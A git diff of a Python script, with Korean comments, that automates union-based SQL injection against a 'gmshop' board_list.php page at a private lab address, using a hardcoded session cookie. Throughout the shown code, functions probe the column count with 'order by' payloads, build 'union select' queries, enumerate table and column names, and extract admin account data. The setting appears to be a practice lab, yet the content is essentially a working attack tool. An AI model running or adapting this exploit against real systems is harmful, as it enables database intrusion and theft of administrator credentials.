@@ -5,6 +5,8 @@ import re
 URL = 'http://192.168.81.129/gmshop/board_list.php'
 cookies = {"PHPSESSID":"da519c2141b0a35c10d91abd16b4d2d0"}
 
+
+
 # 사진 컨테스트 컬럼 정보 파싱
 def get_use_column(response):
     html = response.text
@@ -21,15 +23,21 @@ def get_use_column(response):
 def get_html(response):
     html = response.text
     soup = BeautifulSoup(html, 'html.parser')
-    my_table = soup.select(
-        'td'
-    )
+    my_table = soup.select('td')
     data=''
     for table in my_table:
-        ## Tag안의 텍스트
-        # print(table.text)
         data+=table.text
     return data
+
+# post_data = {'boardIndex':'4',
+# 'search':'name', 
+# 'searchstring':'\' order by 26#'}
+
+# res = requests.post(URL, data = post_data, cookies=cookies)
+# data = get_html(res)
+# print(data)
+
+
 
 # 컬럼 수 
 def column_num():
@@ -40,11 +48,13 @@ def column_num():
 
         res = requests.post(URL, data = post_data, cookies=cookies)
         data = get_html(res)
+        
 
         check_warning = re.findall("mysql_fetch_array()", data)
+        print('[+] 컬럼 수 쿼리 '+post_data.get("searchstring"))
 
         if check_warning:
-            print('[+] 컬럼 수 쿼리 '+post_data.get("searchstring"))
+            # print('[+] 컬럼 수 쿼리 '+post_data.get("searchstring"))
             return i # table numberic
 
 # 사용 컬럼 개수 위치 파악 쿼리 제작
@@ -85,8 +95,7 @@ def get_table_name_query(num):
 # 테이블 이름 리스트
 def get_table_name_list(response):
     html = response.text
-    soup = BeautifulSoup(html, 'html.parser')
-    # data = soup.find('div',align='center')
+    soup = BeautifulSoup(html, 'html.parser')    
     _name = soup.find_all('font', color="009BD4")
     name_list = []
     for name in _name:
@@ -114,6 +123,7 @@ def get_table_name(query):
                 break
     return exploit_table_list
 
+
 # 컬럼 정보 가져오기 쿼리 제작
 def get_column_info_query(num, exploitTableName):
     get_column_info_query = "union select "
@@ -135,6 +145,7 @@ def get_column_info_filter(response):
     for info in _column_info:
         # print(info.text)
         info_list.append(info.text)
+        print(info_list)
     return info_list
 
 
@@ -155,6 +166,8 @@ def get_column_info(query):
             cnt += 1            
     
     return column_info_idx  
+
+
 
 # admin 테이블 컬럼 확인 쿼리 제작
 def get_admin_table_query(num, adminColumn, exploitTableName):
@@ -194,6 +207,7 @@ def get_admin_table(query):
     print('[+] admin 테이블 컬럼 확인 쿼리 '+post_data.get('searchstring'))
     res = requests.post(URL, data = post_data, cookies=cookies)
     admin_account = get_admin_table_filter(res)
+    print(admin_account)
     return admin_account
 
 
